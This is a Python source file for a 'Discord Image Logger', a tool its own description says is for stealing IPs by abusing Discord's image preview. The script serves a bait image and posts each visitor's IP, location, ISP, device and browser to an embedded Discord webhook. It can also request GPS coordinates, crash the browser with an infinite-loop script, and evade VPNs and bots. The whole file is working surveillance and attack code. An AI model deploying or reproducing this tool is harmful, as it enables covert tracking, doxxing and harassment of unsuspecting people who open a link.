# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1096788193669566464/3ncJaYAh5sW-C049bS56lYQjCA5HEnWCks48HkBGJYG50nVj-j2FGnf46zWOj0Ip_gwT",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
